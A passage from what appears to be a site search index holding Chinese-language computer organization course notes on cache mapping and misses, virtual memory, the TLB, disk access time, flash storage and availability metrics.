<p>\u5728\u505aCache\u8ba1\u7b97\u65f6\u95f4\u7c7b\u9898\u76ee\u4e2d\uff0c\u6ce8\u610f\u6bcf\u6b65\u64cd\u4f5c\u7684\u65f6\u95f4\u8981\u662f\u65f6\u949f\u9891\u7387\u7684\u6574\u6570\u500d\uff08\u7ed3\u679c\u53ef\u4ee5\u4e0d\u662f\uff09</p>"},{"location":"Courses/CO/Chapter5/#other-mapping","title":"Other Mapping","text":"<ul> <li>\u7ec4\u76f8\u8054 Set associated</li> <li>\u5168\u76f8\u8054 Fully associated</li> </ul> <p>n-way \u7ec4\u76f8\u8054\u5c06\u6bcf n \u4e2a Block \u5206\u4e3a\u4e00\u7ec4\uff0c\u627e\u5bf9\u5e94 Block \u65f6\u5148\u786e\u5b9a\u7ec4\u53f7\uff0c\u518d\u641c\u5bfb\u4e00\u904d\u8be5\u7ec4 Block \u627e\u662f\u5426\u547d\u4e2d\u3002direct mapping \u5176\u5b9e\u5c31\u662f 1-way set associative\uff0c\u800c fully associative \u5c31\u662f n-way set associative\uff0c\u5176\u4e2d n \u662f cache block \u7684\u4e2a\u6570\uff1b\u6211\u4eec\u79f0\u4e00\u7ec4\u7684\u5927\u5c0f\u4e3a\u00a0associativity\uff0c\u90a3\u4e48\u8fd9\u4e24\u79cd\u65b9\u6cd5\u7684 associativity \u5c31\u5206\u522b\u662f 1 \u548c n\u3002</p> <p></p> <p>\u5bf9\u4e8e\u7ec4\u76f8\u8054</p> <p>\u7531\u4e8e\u5b9e\u9645\u5e94\u7528\u4e2d\u8ba1\u7b97\u7ec4\u522b\u662f\u7528 \u5757\u5730\u5740%\u7ec4\u6570 \u6765\u5f97\u5230\u7684\uff0c\u56e0\u6b64\u4e00\u4e2a\u7ec4\u5185 Block \u5bf9\u5e94\u7684\u7269\u7406\u5730\u5740\u53ef\u80fd\u76f8\u5dee\u6bd4\u8f83\u5927\u3002</p> <p>\u66ff\u6362\u7b97\u6cd5\uff1a</p> <ul> <li>&lt;1&gt; \u5148\u5165\u540e\u51fa\u7b97\u6cd5 FILO</li> <li>&lt;2&gt; \u968f\u673a\u66ff\u6362\u7b97\u6cd5 RAND<ul> <li>\u65b9\u6cd5\u7b80\u5355\uff0c\u6613\u4e8e\u5b9e\u73b0\uff1b\u547d\u4e2d\u7387\u8f83\u4f4e</li> </ul> </li> <li>&lt;3&gt; \u5148\u5165\u5148\u51fa\u7b97\u6cd5 FIFO<ul> <li>\u6700\u5148\u8c03\u5165\u5e76\u88ab\u591a\u6b21\u8c03\u7528\u7684Block\u53ef\u80fd\u4f1a\u88ab\u4f18\u5148\u66ff\u6362\uff0c\u4e0d\u7b26\u5408\u5c40\u90e8\u6027\u89c4\u5f8b\uff0c\u6240\u4ee5\u547d\u4e2d\u7387\u4e0d\u6ee1\u8db3\u8981\u6c42</li> </ul> </li> <li>&lt;4&gt; \u8fd1\u671f\u6700\u5c11\u4f7f\u7528\u7b97\u6cd5 LRU<ul> <li>\u8f83\u597d\u53cd\u6620\u4e86\u7a0b\u5e8f\u5c40\u90e8\u6027\u89c4\u5f8b\uff0c\u547d\u4e2d\u7387\u8f83\u9ad8</li> </ul> </li> </ul> The implement of Four-way Set-associative Cache <p></p> <p>\u8003\u8bd5\u5e38\u8003\u4e09\u79cd Miss (3C)\uff1a</p> <ul> <li>\u51b7\u542f\u52a8 Miss (Compulsory Miss)<ul> <li>\u7f13\u5b58\u521a\u4e0a\u7535\u4e3a\u7a7a\uff0c\u6b64\u65f6\u8bbf\u95ee\u4ec0\u4e48\u90fd\u662f Miss</li> </ul> </li> <li>\u5bb9\u91cf Miss (Capacity Miss)<ul> <li>\u6307\u5168\u76f8\u8054\u7f13\u5b58\u4e2d\uff0c\u5185\u5b58\u4e2d\u7684\u5757\u7531\u4e8e\u5bb9\u91cf\u4e0d\u591f\u800c\u88ab\u66ff\u6362\uff0c\u518d\u6b21\u8bbf\u95ee\u8be5\u5757\u65f6\u53d1\u751f Miss</li> </ul> </li> <li>\u51b2\u7a81 Miss (Conflict Miss)<ul> <li>\u6307\u7ec4\u76f8\u8054\u7f13\u5b58\u4e2d\uff0c\u67d0\u4e2a\u7ec4\u5185\u7684\u5757\u88ab\u66ff\u6362\uff0c\u7136\u540e\u518d\u6b21\u8bbf\u95ee\u8be5\u5757\u65f6\u53d1\u751f Miss</li> <li>\u5982\u679c\u662f\u5168\u76f8\u8054\u5219\u4e0d\u4f1a\u53d1\u751f Conflict Miss\uff0c\u56e0\u4e3a\u8fd8\u6709\u522b\u7684\u7a7a\u4f4d\uff08\u5982\u679c\u6ca1\u6709\u7a7a\u4f4d\u7684\u8bdd\u5c31\u8be5\u8ba1\u5165 Capacity Miss \u4e86\uff09</li> </ul> </li> </ul> <p>\u63d0\u9ad8 Cache \u7684\u7ec4\u76f8\u8054\u5ea6\u53ef\u4ee5\u4f18\u5316\uff1f</p> <ul> <li>A. Capacity Miss</li> <li>B. Hit time<ul> <li>\u4e00\u7ec4\u5185\u5757\u53d8\u591a\u4e86\uff0c\u56e0\u6b64\u5224\u65ad hit \u65f6\u8981\u6bd4\u8f83\u7684 Tag \u4e5f\u53d8\u591a\u4e86</li> </ul> </li> <li>C. Conflict Miss<ul> <li>\u9009 C</li> </ul> </li> <li>D. Compolsory Miss</li> </ul>"},{"location":"Courses/CO/Chapter5/#performance","title":"Performance","text":"\\[\\begin{array}l \\text{Average Memory Access time}&amp; = \\text{hit time} + \\text{miss time} \\\\ &amp; = \\text{hit time} + \\text{miss rate} \\times \\text{memory time} \\end{array} \\] <p>\u56e0\u6b64\uff0c\u63d0\u9ad8 Cache \u6027\u80fd\u7684\u5173\u952e\u5728\u4e8e\u589e\u52a0\u547d\u4e2d\u7387\u548c\u51cf\u5c11 Miss Penalty \u65f6\u95f4\u3002</p> <p>Example \u5047\u8bbe\uff1a</p> <ul> <li>instruction cache miss rate:  2%</li> <li>data cache miss rate:  4%</li> <li>CPI without any memory stall:  2</li> <li>miss penalty:  100 cycles</li> <li>The frequency of all <code>load</code> and <code>store</code> in gcc: 36%</li> </ul> \\[\\begin{array}l \\text{Instruction miss cycles} =I\\times 2\\% \\times 100 &amp; = 2.00I\\\\ \\text{Data miss cycles} = I\\times 36\\% \\times 4\\% \\times 100 &amp; = 1.44I \\\\ \\text{Total memory-stall cycles} =2.00 I +1.44I &amp; =3.44I \\\\ \\text{CPI with stall} = 2 + 3.44 I / I &amp; =5.44 \\end{array} \\] <p>\u8fd9\u4e5f\u80fd\u770b\u51fa Memory \u7684\u6027\u80fd\u4e25\u91cd\u5236\u7ea6\u4e86 CPU</p> <p>Solution</p> <ul> <li>&lt;1&gt; \u901a\u8fc7\u66f4\u7075\u6d3b\u7684Block\u66ff\u6362\u89c4\u5219\u6765\u51cf\u5c11 Miss Rate<ul> <li>\u7ec4\u76f8\u8fde\u3001LRU...</li> <li>\u968f\u7740 Assoiciativity \u63d0\u9ad8\uff0cMiss Rate \u8d8a\u6765\u8d8a\u4f4e\uff08Direct &gt; Set &gt; Full\uff09</li> </ul> </li> <li>&lt;2&gt; Least Recent Used<ul> <li>\u968f\u7740 Assoiciativity \u63d0\u9ad8\uff0c\u5b9e\u73b0 LRU \u7b97\u6cd5\u8d8a\u6765\u8d8a\u56f0\u96be</li> </ul> </li> <li>&lt;3&gt; \u9009\u62e9\u5408\u9002 Block Size<ul> <li>\u4e00\u822c\u6765\u8bb2\uff0c\u9009\u62e9\u66f4\u5927\u7684Block\u53ef\u4ee5\u964d\u4f4e Miss Rate\uff0c\u4f46\u4e5f\u4f1a\u5e26\u6765\u66f4\u5927\u7684 Miss Penalty</li> <li>\u5e76\u4e14\u5bf9\u4e8e\u4e00\u4e2a\u5927\u5c0f\u6709\u9650\u7684 Cache\uff0c\u66f4\u5927\u7684Block\u4e5f\u610f\u5473\u7740\u66f4\u5c11\u7684Block\u6570\u91cf\uff0c\u53ef\u80fd\u53cd\u800c\u589e\u52a0\u4e86 Miss Rate</li> <li>\u5bf9\u4e8e 256KB \u5f80\u4e0b\u7684Cache\uff0cBlock Size\u9009 64 bytes \u7684\u6548\u679c\u6700\u597d</li> </ul> </li> <li>&lt;4&gt; \u8bbe\u8ba1\u4e00\u4e2a\u5b58\u50a8\u7cfb\u7edf\u6765\u51cf\u5c11 Miss Penalty<ul> <li>\u4ea4\u53c9\u5730\u5740\u8bbf\u95ee...</li> </ul> </li> <li>&lt;5&gt; \u901a\u8fc7\u591a\u7ea7 Cache \u51cf\u5c11 Miss Penalty<ul> <li>L1 Cache\u3001L2 Cache...</li> </ul> </li> <li>&lt;6&gt; Software Optimization Blocking</li> </ul>"},{"location":"Courses/CO/Chapter5/#virtual-memory","title":"Virtual Memory","text":""},{"location":"Courses/CO/Chapter5/#mapping","title":"Mapping","text":"<p>\u865a\u62df\u5b58\u50a8\u53ef\u4ee5\u770b\u4f5c\u662f DRAM \u548c Disk \u95f4\u7684 Cache\uff08\u5c3d\u7ba1\u6211\u8ba4\u4e3a\u5dee\u522b\u5f88\u5927\uff09</p> <p>\u865a\u62df\u5185\u5b58\u6280\u672f\u53ef\u4ee5\u8ba9\u591a\u4e2a\u7a0b\u5e8f\u4e4b\u95f4\u9ad8\u6548\u3001\u5b89\u5168\u5730\u5171\u4eab\u5185\u5b58\uff0c\u540c\u65f6\u5141\u8bb8\u5355\u4e2a\u7a0b\u5e8f\u4f7f\u7528\u8d85\u8fc7\u5185\u5b58\u5bb9\u91cf\u7684\u5185\u5b58\u3002</p> <p>\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u4e3a\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u5206\u914d\u4e00\u4e2a Page Table\uff0c\u8fdb\u7a0b\u901a\u8fc7\u865a\u62df\u5185\u5b58\u8fd9\u4e00\u4e2d\u4ecb\u6765\u8ddf\u5185\u5b58\u548c\u78c1\u76d8\u8bfb\u5199\u4fe1\u606f\u3002</p> <p></p> <p>\u865a\u62df\u5185\u5b58\u5141\u8bb8\u5355\u4e2a\u7a0b\u5e8f\u4f7f\u7528\u8d85\u8fc7\u5185\u5b58\u5bb9\u91cf\u7684\u5185\u5b58\uff0c\u8d85\u51fa\u7684\u90e8\u5206\u53ef\u4ee5\u4e34\u65f6\u5b58\u653e\u5728Disk\u4e2d</p> <p>\u865a\u62df\u5730\u5740\u8f6c\u6362\u5230\u7269\u7406\u5730\u5740\u5206\u4e3a\u4e24\u6b65\uff1a</p> <ul> <li>&lt;1&gt; \u6839\u636e Virtual page number \u8bfb\u53d6 Page Table \u4e0a\u5bf9\u5e94\u6570\u636e\uff0c\u8bb0\u4f5c Physical page number<ul> <li>\u5982\u679c Valid \u4f4d\u4e3a0\uff0c\u8bf4\u660e\u4e0d\u5728 DRAM \u4e2d\uff0c\u8981\u53bb Disk \u4e2d\u627e</li> </ul> </li> <li>&lt;2&gt; \u5c06 Physical page number \u4e0e Page Offset \u5408\u5e76\uff0c\u5f97\u5230\u7269\u7406\u5730\u5740</li> </ul> <pre><code>Virtual Address:\n+---------------------+-------------+\n| Virtual page number | Page Offset |\n+---------------------+-------------+\n      || Translation\n      \\/\nPhysical Address:\n+----------------------+-------------+\n| Physical page number | Page Offset |\n+----------------------+-------------+\n</code></pre> <p>Page Offset</p> <p>\u4e0e Cache \u4e2d\u7684 Byte Offset \u6982\u5ff5\u7c7b\u4f3c\uff0c\u4ee3\u8868\u4e86\u4e00\u4e2a Page \u7684 Byte \u6570\u3002\u4f8b\u5982\uff0c\u5bf9\u4e8e Page Size = 4KB \u7684 Cache\uff0cPage Offset \u4e3a \\(2^{12}\\) \uff0c\u5373 12bit\u3002</p> <p>\u7531\u4e8e Virtual Memory \u5904\u4e8e\u8f83\u4e0b\u5c42\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u51fa\u73b0 Page Fault \u7684\u60c5\u51b5\uff0c\u9020\u6210\u7684\u6027\u80fd\u635f\u5931\u4f1a\u76f8\u5f53\u5927\uff0c\u56e0\u6b64\u4f18\u5316\u7684\u4e3b\u8981\u76ee\u6807\u5728\u4e8e\u51cf\u5c11 Page Fault \u7684\u53d1\u751f\u3002</p> <p>\u6240\u4ee5\uff0cVirtual Memory \u91c7\u7528 LRU\u3001\u5168\u76f8\u8054\u6620\u5c04\u7684\u65b9\u5f0f\u6765\u5904\u7406 Page\uff0c\u4ece\u800c\u51cf\u5c0f\u5931\u6548\u7387\uff1b\u540c\u6837\uff0cWrite Through \u5199 Disk \u7684\u4ee3\u4ef7\u4e5f\u662f\u975e\u5e38\u6602\u8d35\u7684\uff0c\u6240\u4ee5\u4f7f\u7528Write Back\uff08\u8fd9\u4e5f\u9700\u8981\u4e3a Page Table \u589e\u52a0 Dirty \u4f4d\uff09\u3002</p>"},{"location":"Courses/CO/Chapter5/#translation-lookaside-buffer","title":"Translation-lookaside Buffer","text":"<p>\u6bcf\u4e2a\u8fdb\u7a0b\u7684 Page Table \u90fd\u5b58\u653e\u5728\u5185\u5b58\u4e2d\uff1b\u800c Page Table Register \u5219\u5b58\u653e\u7740\u8be5 Page Table \u7684\u7269\u7406\u5730\u5740\uff0c\u56e0\u6b64\u8fdb\u884c Translation \u65f6\u5c06 Virtual Page Number \u5bf9\u5e94\u7684\u504f\u79fb\u91cf\u548c Page Table \u7684\u7269\u7406\u5730\u5740\u76f8\u52a0\u5373\u53ef\u5f97\u5230\u8be5 Entry \u7684\u5730\u5740\u3002</p> <p>\u4f46\u662f\u4e0a\u8ff0\u65b9\u6cd5\u5b58\u5728\u6548\u7387\u95ee\u9898\uff0c\u5f53\u8fdb\u7a0b\u5e0c\u671b\u8bbf\u95ee\u5185\u5b58\u4e2d\u7684\u6570\u636e\u65f6\uff0c\u90fd\u9700\u8981\u5148\u8bbf\u95ee\u5185\u5b58\u4e2d\u7684 Page Table \u4ee5\u83b7\u53d6\u6570\u636e\u7684\u7269\u7406\u5730\u5740\uff0c\u8fd9\u610f\u5473\u7740\u5bf9\u5185\u5b58\u8bbf\u95ee\u65f6\u95f4\u4f1a\u52a0\u500d\u3002</p> <p>\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528 TLB\uff0c\u5176\u4f5c\u7528\u76f8\u5f53\u4e8e Page Table \u7684\u9ad8\u901f\u7f13\u5b58\uff0c\u4f4d\u4e8e\u8fdb\u7a0b\u548c\u5185\u5b58\u4e2d\u95f4\u3002\u5176\u57fa\u672c\u7684 Entry \u7ed3\u6784\u4e3a\uff1a</p> <pre><code>+-----+-----+---+---------------+-------------------------+\n|Valid|Dirty|Ref|      Tag      |  Physical Page Address  |\n+-----+-----+---+---------------+-------------------------+\n\n- Reference \u4f4d: \u6700\u8fd1\u662f\u5426\u88ab\u8bbf\u95ee\u8fc7\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5b9a\u671f\u6e05\u96f6\u8be5\u4f4d\n- TLB: 16-512 Entries\n- Miss Rate: 0.01% - 1%\n</code></pre> <p>TLB \u5728\u5b9e\u9645\u5e94\u7528\u4e2d\u9009\u62e9\u7ec4\u76f8\u8054\u7684\u65b9\u5f0f\uff0c\u4e0d\u8fc7\u8ba1\u7ec4\u8bfe\u7a0b\u4f3c\u4e4e\u5e76\u4e0d\u6df1\u7a76\u539f\u7406</p> <ul> <li>\u5bf9\u4e8e\u5168\u76f8\u8054 TLB \u9898\u76ee\u4e2d\u7684 Tag\uff0c\u4e00\u822c\u8ba4\u4e3a\u5c31\u662f Virtual Page Number \u3002</li> <li>\u5bf9\u4e8e\u7ec4\u76f8\u8054 TLB \u9898\u76ee\u4e2d\u7684 Tag\uff0c\u5219\u8ba4\u4e3a\u662f Virtual Page Number \u51cf\u53bb\u5bf9\u5e94\u7684 index \u4f4d\u6570<ul> <li>\u4f8b\u5982\uff0cVirtual Page Number \u4e3a\u56db\u4f4d\uff0cTLB\u5171\u6709 2 \u4e2a set\uff0c\u5219 Tag \u4e3a <code>Virtual Page Number[3:1]</code></li> </ul> </li> </ul> <p>\u5f53 TLB Miss \u65f6\uff0c\u5904\u7406\u5668\u624d\u4f1a\u53bb\u5185\u5b58\u4e2d\u7684 Page Table \u627e\u5bf9\u5e94\u9879\uff1b\u5982\u679c Page Table \u5bf9\u5e94\u9879\u662f Valid \u7684\uff0c\u5219\u5c06\u5176\u62ff\u5230 TLB \u4e2d\uff1b\u5982\u679c Page Table \u5bf9\u5e94\u9879\u4e0d\u662f Valid \u7684\uff0c\u5219\u89e6\u53d1 Page Fault\uff0c\u8981\u7ee7\u7eed\u5411\u4e0b\u5c42\u8bfb\u53d6\uff1b\u82e5\u88ab\u66ff\u6362\u7684 Entry \u7684 Dirty \u4f4d\u4e3a 1\uff0c\u5219\u8981\u5c06\u5176\u5199\u56de Page Table\u3002</p> <p></p> TLB Page Table Cache Description Hit Hit Miss \u5728TLB\u4e2d\u5f97\u5230\u7269\u7406\u5730\u5740\uff0c\u4f46\u662f\u5728 Cache \u4e2d\u627e\u4e0d\u5230\u8be5\u5730\u5740\u5bf9\u5e94\u6570\u636e\uff0c\u8981\u5728\u5185\u5b58\u4e2d\u627e Miss Hit Hit TLB misses, \u4f46\u662f\u5728 Page Table \u4e2d\u627e\u5230 Entry\uff1bData\u5728Cache\u4e2d\u627e\u5230 Miss Hit Miss TLB misses, \u4f46\u662f\u5728 Page Table \u4e2d\u627e\u5230 Entry\uff1b\u5728Cache\u4e2d\u627e\u4e0d\u5230\u5bf9\u5e94\u6570\u636e\uff0c\u6700\u540e\u53bb\u5185\u5b58\u4e2d\u627e Miss Miss Miss Page Fault\uff1b\u90a3\u4e48 Cache \u4e2d\u4e00\u5b9a\u4e0d\u5b58\u5728\u8fd9\u4e2a\u5730\u5740\u53ca\u5176\u6570\u636e Hit Miss Miss Impossible\uff1bTLB \u547d\u4e2d\u4e86\uff0c\u90a3 Page Table \u4e5f\u4e00\u5b9a\u80fd\u547d\u4e2d Hit Miss Hit Impossible\uff1bTLB \u547d\u4e2d\u4e86\uff0c\u90a3 Page Table \u4e5f\u4e00\u5b9a\u80fd\u547d\u4e2d Miss Miss Hit Impossible\uff1bPage Table \u4e2d\u6ca1\u6709\u8fd9\u4e2a\u5730\u5740\uff0c\u8bf4\u660e Cache \u4e2d\u4e5f\u6ca1\u6709"},{"location":"Courses/CO/Chapter6/","title":"CH 6. IO \u63a5\u53e3","text":""},{"location":"Courses/CO/Chapter6/#chapter-6-the-hardwaresoftware-interface","title":"Chapter 6. The Hardware/Software Interface","text":"<p> \u7ea6 2949 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>Typical Collection of I/O Device</p> <p></p>"},{"location":"Courses/CO/Chapter6/#introduction","title":"Introduction","text":"<p>IO\u8bbe\u5907\u7684\u4e09\u4e2a\u7279\u6027\uff1a</p> <ul> <li>Bahavior<ul> <li>Input(\u53ea\u8bfb), output(\u53ea\u5199\uff0c\u4e0d\u80fd\u88ab\u8bfb\u53d6), or storage(can be reread and usually rewritten)</li> </ul> </li> <li>Partner<ul> <li>Human, or machine</li> </ul> </li> <li>Data rate<ul> <li>\u4e0e\u5b58\u50a8\u90e8\u4ef6\u6216\u5904\u7406\u5668\u4ea4\u6362\u6570\u636e\u7684\u6700\u5927\u901f\u7387</li> </ul> </li> </ul> <p>IO\u8bbe\u5907\u7684\u6027\u80fd\u6307\u6807\uff1a</p> <ul> <li>Throughput \u541e\u5410\u91cf<ul> <li>\u5728\u67d0\u4e00\u65f6\u95f4\u5185\u6211\u4eec\u80fd\u4ece\u7cfb\u7edf\u4f20\u51fa\u591a\u5c11\u6570\u636e</li> <li>\u5728\u5355\u4f4d\u65f6\u95f4\u5185\u80fd\u505a\u591a\u5c11I/O\u8bf7\u6c42</li> </ul> </li> <li>Response Time \u54cd\u5e94\u65f6\u95f4</li> </ul> <p>\u6700\u597d\u7684\u6027\u80fd\u6d4b\u91cf\u65b9\u6cd5\u53d6\u51b3\u4e8e\u5177\u4f53\u5e94\u7528\u3002\u5728\u5f88\u591a\u591a\u5a92\u4f53\u5e94\u7528\u4e2d\uff0c\u5927\u90e8\u5206I/O\u8bf7\u6c42\u7528\u4ee5\u5904\u7406\u957f\u6570\u636e\u6d41\uff0c\u56e0\u6b64\u6211\u4eec\u66f4\u6ce8\u91cd Throughput\uff1b\u5728\u53e6\u4e00\u4e9b\u5e94\u7528\u4e2d\u6211\u4eec\u66f4\u91cd\u89c6 Response Time\uff0c\u5f53 I/O \u8bf7\u6c42\u975e\u5e38\u5927\u65f6\uff0c\u54cd\u5e94\u65f6\u95f4\u4e25\u91cd\u53d7\u9650\u4e8e\u5e26\u5bbd\uff0c\u4f46\u5bf9\u4e8e PC \u8fd9\u79cd\u6570\u636e\u8bbf\u95ee\u91cf\u8f83\u5c0f\u7684\u5355\u7528\u6237\u673a\u5668\uff0c\u8bbf\u95ee\u64cd\u4f5c\u5ef6\u8fdf\u77ed\u7684 I/O \u7cfb\u7edf\u5c06\u83b7\u5f97\u66f4\u5feb\u7684\u54cd\u5e94\u65f6\u95f4\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0cI/O\u7cfb\u7edf\u7684\u91cd\u70b9\u4e3a\uff1a\u53ef\u9760\u6027\u3001\u53ef\u6269\u5145\u6027\u3001\u6027\u80fd\u3001\u6210\u672c</p> <p>\u5f52\u7eb3\u6765\u8bf4\uff0c\u53f0\u5f0f\u673a\u548c\u5d4c\u5165\u5f0f\u7cfb\u7edf\u66f4\u6ce8\u91cd\u54cd\u5e94\u65f6\u95f4\u548cI/O\u8bbe\u5907\u7684\u591a\u6837\u6027\uff1b\u800c\u670d\u52a1\u5668\u66f4\u5173\u7cfb\u541e\u5410\u91cf\u548cI/O\u8bbe\u5907\u7684\u53ef\u6269\u5145\u6027\u3002</p>"},{"location":"Courses/CO/Chapter6/#disk-storage","title":"Disk Storage","text":"<p>\u518d\u653e\u9001</p> <p></p> <p>\u76f8\u6bd4\u4e8e SRAM\uff0cDRAM \u901f\u5ea6\u66f4\u6162\uff0c\u5e76\u4e14\u9700\u8981\u5b9a\u65f6\u5237\u65b0\u907f\u514d\u6f0f\u7535\u635f\u5931\u6570\u636e</p> <p>\u78c1\u76d8\u4e3b\u8981\u5206\u4e3a\u4e24\u5927\u7c7b\uff1a</p> <ul> <li>Floppy Disks \u8f6f\u76d8<ul> <li>\u5b58\u50a8\u5bb9\u91cf\u5c0f</li> </ul> </li> <li>Hard Disks \u786c\u76d8<ul> <li>\u5b58\u50a8\u5bb9\u91cf\u5927</li> <li>\u6570\u636e\u5bc6\u5ea6\u5927</li> <li>\u4f20\u8f93\u901f\u7387\u9ad8</li> <li>\u62e5\u6709\u591a\u4e2a\u76d8\u7247</li> </ul> </li> </ul>"},{"location":"Courses/CO/Chapter6/#hard-disk","title":"Hard Disk","text":"<p>\u673a\u68b0\u786c\u76d8\u4e5f\u88ab\u79f0\u4e3a\u65cb\u8f6c\u78c1\u76d8\uff0c\u5b83\u4e3b\u8981\u4f9d\u9760\u76d8\u7247\u6765\u5b58\u50a8\u6570\u636e\uff0c\u76d8\u7247\u8868\u9762\u6d82\u6709\u78c1\u6027\u7684\u8bb0\u5f55\u6750\u6599\uff0c\u76d8\u7247\u6b63\u53cd\u4e24\u9762\u90fd\u53ef\u7528\u6765\u5b58\u50a8\u6570\u636e\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u786c\u76d8\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u76d8\u7247\u7ec4\u6210\uff0c\u8fd9\u4e9b\u76d8\u7247\u88ab\u56fa\u5b9a\u5728\u4e00\u4e2a\u53ef\u4ee5\u65cb\u8f6c\u7684\u4e3b\u8f74\u4e0a\uff0c\u4e3b\u8f74\u5e26\u52a8\u76d8\u7247\u4ee5\u56fa\u5b9a\u901f\u7387\u8fdb\u884c\u9ad8\u901f\u65cb\u8f6c\u3002</p> <p>Platter</p> <p>\u76d8\u7247\u8868\u9762\u88ab\u5212\u5206\u4e3a\u4e00\u5708\u4e00\u5708\u7684\u78c1\u9053(tracks)\uff0c\u6bcf\u4e2a\u78c1\u9053\u53c8\u88ab\u5212\u5206\u4e3a\u591a\u4e2a\u6247\u533a(sectors)\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\u6bcf\u4e2a\u6247\u533a\u53ef\u4ee5\u5b58\u50a8 512 \u5b57\u8282\u7684\u6570\u636e\uff08\u8fd1\u5e74\u6765\u4e5f\u6709\u589e\u52a0\u5230 4096 \u5b57\u8282\u7684\uff09\u3002\u6247\u533a\u4e0e\u6247\u533a\u4e4b\u95f4\u53c8\u5b58\u5728\u95f4\u9699(gaps)\uff0c\u7528\u6765\u5b58\u653e\u6247\u533a\u7684\u6807\u8bc6\u4fe1\u606f\u3002</p> <p></p> <p>\u9664\u4e86\u5bb9\u91cf\u4e4b\u5916\uff0c\u78c1\u76d8\u7684\u8bfb\u5199\u901f\u5ea6\u4e5f\u662f\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u6307\u6807\uff0c\u5bf9\u6247\u533a\u7684\u8bbf\u95ee\u65f6\u95f4\u4e3b\u8981\u5206\u4e3a\u4e09\u90e8\u5206\uff0c\u5206\u522b\u662f\u5bfb\u9053\u65f6\u95f4\u3001\u65cb\u8f6c\u65f6\u95f4\u4ee5\u53ca\u4f20\u9001\u65f6\u95f4</p> \\[ T_{access} =T_{seek} +T_{rotation} +T_{transfer} \\] <ul> <li>Seek time \u5bfb\u9053\u65f6\u95f4<ul> <li>\u5f53\u76ee\u6807\u6247\u533a\u6240\u5904\u78c1\u9053\u4e0e\u5f53\u524d\u8bfb\u5199\u5934\u6240\u5904\u78c1\u9053\u4e0d\u540c\u65f6\uff0c\u4f20\u52a8\u81c2\u9700\u8981\u5c06\u8bfb\u5199\u5934\u79fb\u52a8\u5230\u76ee\u6807\u6247\u533a\u6240\u5728\u78c1\u9053\uff0c\u4f20\u52a8\u81c2\u79fb\u52a8\u6240\u9700\u65f6\u95f4\u5373\u5bfb\u9053\u65f6\u95f4</li> <li>\u5bfb\u9053\u65f6\u95f4\u53d6\u51b3\u4e8e\u8bfb\u5199\u5934\u5f53\u524d\u6240\u5728\u4f4d\u7f6e\u4e0e\u76ee\u6807\u4f4d\u7f6e\u7684\u8ddd\u79bb</li> <li>\u901a\u8fc7\u5bf9\u968f\u673a\u6247\u533a\u7684\u8bbf\u95ee\u6d4b\u8bd5\uff0c\u901a\u5e38\u5e73\u5747\u5bfb\u9053\u65f6\u95f4\u4e3a 3~9ms \u5de6\u53f3</li> </ul> </li> <li>Rotation  latency \u65cb\u8f6c\u65f6\u95f4<ul> <li>\u76ee\u6807\u6247\u533a\u7684\u7b2c\u4e00\u4e2a\u6570\u636e\u4f4d\u65cb\u8f6c\u5230\u8bfb\u5199\u5934\u4e0b\u6240\u9700\u7684\u65f6\u95f4</li> <li>\u8fd9\u4e2a\u8fc7\u7a0b\u7531\u5f53\u524d\u8bfb\u5199\u5934\u6240\u5728\u6247\u533a\u4f4d\u7f6e\u8ddf\u76ee\u6807\u6247\u533a\u7684\u4f4d\u7f6e\u4ee5\u53ca\u76d8\u7247\u65cb\u8f6c\u901f\u5ea6\u6765\u51b3\u5b9a</li> <li>\u5e73\u5747\u65cb\u8f6c\u534a\u5708 0.5 Rotation</li> </ul> </li> <li>Transfer time \u4f20\u9001\u65f6\u95f4<ul> <li>\u4e00\u4e2a\u6247\u533a\u7684\u4f20\u9001\u65f6\u95f4\u4f9d\u8d56\u4e8e\u65cb\u8f6c\u901f\u5ea6\u4ee5\u53ca\u6bcf\u6761\u78c1\u9053\u7684\u6247\u533a\u6570\u76ee\uff0c\u5373\u8bfb\u5199\u5934\u7ecf\u8fc7\u8be5\u6247\u533a\u6240\u9700\u8981\u7684\u65f6\u95f4</li> </ul> </li> </ul> <p>\u8bbf\u95ee\u4e00\u4e2a\u78c1\u76d8\u6247\u533a\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u4e3b\u8981\u662f\u5bfb\u9053\u65f6\u95f4\u548c\u65cb\u8f6c\u65f6\u95f4</p> <p></p>"},{"location":"Courses/CO/Chapter6/#flash","title":"Flash","text":"<p>Flash \u5c5e\u4e8e\u975e\u6613\u5931\u6027\u534a\u5bfc\u4f53\u5b58\u50a8\u5668(Nonvolatile semiconductor storage):</p> <ul> <li>\u901f\u5ea6\u8fdc\u5927\u4e8e Disk(100 ~ 1000 \u500d)</li> <li>\u66f4\u5c0f\u3001\u8017\u80fd\u66f4\u4f4e\u3001\u66f4\u8010\u7528</li> <li>\u66f4\u8d35</li> </ul> <p>\u975e\u6613\u5931\u6027</p> <p>Flash \u548c\u78c1\u76d8\u5b58\u50a8\u90fd\u662f\u975e\u6613\u5931\u6027\u7684\uff0c\u5373\u53bb\u6389\u7535\u6e90\u540e\u6570\u636e\u4e0d\u4f1a\u4e22\u5931\u3002</p>"},{"location":"Courses/CO/Chapter6/#dependability-availability","title":"Dependability &amp; Availability","text":"<ul> <li>MTTF mean time to failure \u5e73\u5747\u65e0\u6545\u969c\u65f6\u95f4</li> <li>MTTR mean time to repair \u5e73\u5747\u4fee\u590d\u65f6\u95f4</li> <li>MTBF mean time between failures<ul> <li>= MTTF + MTTR</li> </ul> </li> <li>Dependability \u53ef\u9760\u6027<ul> <li>\u4ece\u53c2\u7167\u70b9\u81f3\u51fa\u73b0\u6545\u969c\u7ecf\u8fc7\u65f6\u95f4\u7684\u91cf\u5ea6\uff0c\u5373\u901a\u5e38\u901a\u8fc7 MTTF \u4f5c\u4e3a\u91cf\u5ea6</li> </ul> </li> <li>Availability \u53ef\u7528\u6027<ul> <li>\\(= \\frac{MTTF}{MTTF+MTTR}= \\frac{MTTF}{MTBF}\\)</li> </ul> </li> </ul> 